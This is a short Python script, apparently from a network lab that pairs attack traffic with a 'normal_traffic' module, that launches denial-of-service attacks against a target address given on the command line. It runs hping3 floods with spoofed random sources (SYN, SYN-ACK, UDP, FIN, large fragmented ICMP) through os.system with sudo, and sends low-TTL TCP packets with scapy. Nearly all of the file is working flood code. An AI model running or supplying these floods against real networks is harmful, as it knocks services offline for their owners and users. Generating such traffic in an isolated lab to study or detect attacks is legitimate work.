import scapy.all as scapy
import sys
import os
import random
from normal_traffic import networks

attack = ["tcp_syn_ack","udp_flood","icmp_flood_frag","fin_flood","syn_flood","ttl_expiry"]


def ttl_expiry_attack(net):
    p = scapy.IP(dst=random.choice(networks[net]),ttl = 2)/scapy.TCP(sport=80,dport=random.randint(1025,65534))
    scapy.send(p, inter = 0.01)

def tuple_gen(network):
    return random.randint(1025,65534),random.randint(80,1000),network

def attack_check(type,network):

    if type == "tcp_syn_ack":
        os.system("sudo hping3 --syn --ack --rand-source --flood -p {0[0]} -d {0[1]} {0[2]}".format(tuple_gen(network)))
    elif type == "udp_flood":
        os.system("sudo hping3 --udp --rand-source --flood -p {0[0]} -d {0[1]} {0[2]}".format(tuple_gen(network)))
    elif type == "icmp_flood_frag":
        os.system("sudo hping3 -1 -d 10000 -i u10 " + network)
    elif type == "fin_flood":
        os.system("sudo hping3 --fin --rand-source --flood -p {0[0]} -d {0[1]} {0[2]}".format(tuple_gen(network)))
    elif type == "syn_flood":
        os.system("sudo hping3 --syn --rand-source --flood -p {0[0]} -d {0[1]} {0[2]}".format(tuple_gen(network)))
    elif type == "ttl_expiry":
        ttl_expiry_attack(network)



if __name__ == "__main__":

    try: 
        attack_type = sys.argv[1]
    except IndexError as e:
        print("Attack type not provided: {}".format(e))
    
    try:
        network = sys.argv[2]
    except IndexError as e:
        print("Network address not provided: {}".format(e))


    if attack_type in attack:
        attack_check(attack_type,network)
        